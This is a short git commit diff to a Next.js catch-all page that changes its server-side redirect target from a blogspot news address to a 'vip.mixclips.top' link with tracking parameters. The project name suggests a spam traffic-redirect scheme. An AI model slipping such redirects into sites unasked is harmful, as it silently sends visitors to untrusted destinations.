6592721002e1eb46baec15fe0f140396c5df9dbf
full-vidios-online <parvessikdar101010@gmail.com>
2026-09-02 18:28:49 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://us-news-hub.blogspot.com`
+					`https://vip.mixclips.top/mix44vip/?utm_source=Saim&utm_medium=Saim100`
 				}`,
 			},
 		};
